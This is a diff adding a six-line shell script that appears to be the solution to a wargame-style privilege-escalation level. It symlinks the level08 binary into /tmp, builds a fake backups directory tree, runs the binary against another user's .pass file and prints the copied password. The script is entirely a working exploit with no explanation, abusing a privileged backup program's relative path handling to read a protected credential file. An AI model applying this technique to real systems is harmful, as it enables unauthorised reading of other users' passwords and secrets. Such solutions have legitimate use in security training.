@@ -1,0 +1,6 @@
+cd /tmp
+ln -s ~/level08
+mkdir -p backups/home/users/level09
+touch backups/.log
+./level08 /home/users/level09/.pass
+cat /tmp/backups/home/users/level09/.pass
